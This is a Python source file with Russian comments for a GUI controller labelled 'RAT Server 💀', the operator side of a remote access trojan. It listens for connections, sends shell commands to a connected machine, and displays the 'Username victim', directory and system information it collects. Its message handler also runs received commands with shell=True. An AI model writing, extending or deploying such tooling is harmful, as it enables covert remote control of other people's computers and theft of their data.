import customtkinter as ctk
import threading
import socket
from virtual_keyboard import NormalKeyboard
import subprocess

active_client = [None]  # Используем список как контейнер
port = 12345
active_user = ["Unknown"]  # Добавили имя пользователя


def safe_textbox_insert(textbox, text):
    textbox.configure(state="normal")
    textbox.insert("end", text)
    textbox.yview("end")
    textbox.configure(state="disabled")

def clear_frame(frame):
    for widget in frame.winfo_children():
        widget.destroy()

def get_user_name(client_socket):
    user_name = ""
    while True:
        data = client_socket.recv(1024).decode(encoding="utf-8", errors="replace")
        user_name += data
        if "END_OF_USER_MSG" in user_name:
            user_name = user_name.replace("END_OF_USER_MSG", "").strip()
            break
    return user_name

def get_current_directory(client_socket):
    current_dir = ""
    while True:
        data = client_socket.recv(1024).decode(encoding="utf-8", errors="replace")
        current_dir += data
        if "END_OF_DIR_MSG" in current_dir:
            current_dir = current_dir.replace("END_OF_DIR_MSG", "").strip()
            break
    return current_dir

def handle_client(client_socket, text_box, username_label):
    while True:
        buffer = ""
        while True:
            chunk = client_socket.recv(1024).decode(encoding="utf-8", errors="replace")
            if not chunk:
                break
            buffer += chunk
            if "END_OF_MSG" in buffer:
                break

        if not buffer:
            break

        # Удаляем маркер и пробелы
        buffer = buffer.replace("END_OF_MSG", "").strip()
        if not buffer:
            continue

        # Обработка по префиксам
        if buffer.startswith("USER:"):
            user_name = buffer[5:]
            active_user[0] = user_name
            username_label.configure(text=f"Username victim: {active_user[0]}")
            safe_textbox_insert(text_box, f"👤 Пользователь: {user_name}\n")
            continue

        elif buffer.startswith("DIR:"):
            current_dir = buffer[4:]
            safe_textbox_insert(text_box, f"📁 Директория: {current_dir}\n")
            continue

        elif buffer.startswith("INFO:"):
            info = buffer[5:]
            safe_textbox_insert(text_box, f"🖥 Системная информация:\n{info}\n")
            continue

        elif buffer.startswith("CMD:"):
            command = buffer[4:]
            if command.lower() in ("exit", "cls", "clear"):
                if command.lower() in ("cls", "clear"):
                    text_box.configure(state="normal")
                    text_box.delete("1.0", "end")
                    text_box.configure(state="disabled")
                else:
                    break
                continue

            response = execute_command(command)
            print(f"Отправлен ответ: {response}")
            client_socket.send((response + "END_OF_MSG").encode(encoding="utf-8", errors="replace"))
            safe_textbox_insert(text_box, f"📤 Ответ от клиента:\n{response}\n")
            continue

        else:
            # Непредсказуемое сообщение — игнор или лог
            print(f"[⚠️ Неизвестный тип сообщения]: {buffer}")
            continue

def is_message_end(data):
    return (
        data.endswith("END_OF_USER_MSG") or 
        data.endswith("END_OF_DIR_MSG") or 
        data.endswith("END_OF_MSG")
    )


def is_command(data):
    return not is_message_end(data)

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout if result.stdout else result.stderr
        return output
    except Exception as e:
        return f"❌ Ошибка выполнения команды: {e}"

def start_server_thread(server_socket, text_box, status_label, username_label):
    while True:
        try:
            client_socket, client_address = server_socket.accept()
            active_client[0] = client_socket
            status_label.configure(text="🟢 Connected", text_color="green")
            print(f"Клиент подключен: {client_address}")
            text_box.insert("end", "Client is connected")
            client_thread = threading.Thread(target=handle_client, args=(client_socket, text_box, username_label))
            client_thread.daemon = True
            client_thread.start()
        except Exception as e:
            print(f"Ошибка подключения: {e}")
            safe_textbox_insert(text_box, f"❌ Ошибка подключения: {e}\n")
            status_label.configure(text="🔴 Error", text_color="red")
            break

def send_command_to_client(command_line, client_socket, text_box):
    """Отправка команды на клиент или выполнение локально, если не подключено"""
    command = command_line.get()
    if not command:
        return
    
    if command in ("cls", "clear"):
        text_box.configure(state="normal")
        text_box.delete("1.0", "end")
        text_box.configure(state="disabled")
        command_line.delete(0, "end")
        return

    if client_socket:
        # Клиент подключён — отправляем команду
        safe_textbox_insert(text_box, f"📤 Отправлена команда: {command}\n")
        text_box.yview("end")
        try:
            client_socket.send(command.encode(encoding="utf-8", errors="replace"))
            response = client_socket.recv(1024).decode(encoding="utf-8", errors="replace")
            safe_textbox_insert(text_box, f"📥 Ответ от клиента: {response}\n")
        except Exception as e:
            safe_textbox_insert(text_box, f"❌ Ошибка отправки: {e}\n")
    else:
        # Клиент не подключён — выполняем локально
        safe_textbox_insert(text_box, f"⚙ Выполнение локально: {command}\n")
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = result.stdout if result.stdout else result.stderr
            safe_textbox_insert(text_box, f"📥 Локальный вывод:\n{output}\n")
        except Exception as e:
            safe_textbox_insert(text_box, f"❌ Ошибка локального выполнения: {e}\n")
    command_line.delete(0, "end")
    text_box.yview("end")

def server(parent_frame, go_back_callback=None):
    clear_frame(parent_frame)

    # Сокет и запуск сервера
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', port))
    server_socket.listen(1)

    # Основной контейнер с горизонтальным разделением (левая и правая части)
    main_frame = ctk.CTkFrame(parent_frame, fg_color="#0f0f0f")
    main_frame.pack(fill="both", expand=True)

    # Левая часть (панель кнопок)
    left_frame = ctk.CTkFrame(main_frame, width=200)
    left_frame.pack(side="left", fill="y", padx=10, pady=10)

    # Правая часть (состоит из верхней и нижней)
    right_frame = ctk.CTkFrame(main_frame)
    right_frame.pack(side="left", fill="both", expand=True, padx=10, pady=10)

    # Верхняя часть правой панели (текстбокс и поле ввода)
    top_right_frame = ctk.CTkFrame(right_frame)
    top_right_frame.pack(side="top", fill="both", expand=True)

    # Нижняя часть правой панели (виртуальная клавиатура)
    bottom_right_frame = ctk.CTkFrame(right_frame, height=200)
    bottom_right_frame.pack(side="bottom", fill="x")

    # === Левая панель ===
    title = ctk.CTkLabel(left_frame, text="RAT Server 💀", font=ctk.CTkFont(family="Consolas", size=18, weight="bold"), text_color="#8a2be2")
    title.pack(pady=5)

    # === Правая верхняя панель ===
    command_line = ctk.CTkEntry(top_right_frame, placeholder_text="Enter command...", fg_color="#111111", text_color="#39ff14", placeholder_text_color="#444444")
    command_line.pack(fill="x", padx=5, pady=5)

    send_button = ctk.CTkButton(
        top_right_frame,
        text="📤 Отправить",
        command=lambda: send_command_to_client(command_line, active_client[0], text_box), 
        fg_color="#1a1a1a", 
        hover_color="#8a2be2", 
        text_color="#ff0033"
    )
    send_button.pack(padx=5, pady=5)

    text_box = ctk.CTkTextbox(top_right_frame, fg_color="#0f0f0f", text_color="#39ff14")
    text_box.pack(fill="both", expand=True, padx=5, pady=5)

    # === Правая нижняя панель (клавиатура) ===
    keyboard = NormalKeyboard(bottom_right_frame, command_line, key_width=30, key_height=20)

    # === Кнопка для старта сервера ===
    def run_server():
        thread = threading.Thread(target=start_server_thread, args=(server_socket, text_box, status_label, username_label))
        thread.daemon = True
        thread.start()

    start_server_btn = ctk.CTkButton(left_frame, text="🚀 Start Server", command=run_server)
    start_server_btn.pack(pady=10)

    back_btn = ctk.CTkButton(left_frame, text="← Back", command=go_back_callback)
    back_btn.pack(pady=10)

    Info = ctk.CTkLabel(left_frame, text="ℹ️ Info:", text_color="#040177")
    Info.pack(pady=10)

    # Индикатор подключения
    status_label = ctk.CTkLabel(left_frame, text="🔴 Not connected", text_color="red")
    status_label.pack(pady=5)

    username_label = ctk.CTkLabel(left_frame, text=f"Username victim: {active_user[0]}")
    username_label.pack(pady=5)

    # === Логирование в text_box ===
    safe_textbox_insert(text_box, f"listen on the port: {port}...\n")
    text_box.configure(state="disabled")
    text_box.pack(pady=10, fill="both", expand=True, padx=20)

    run_server()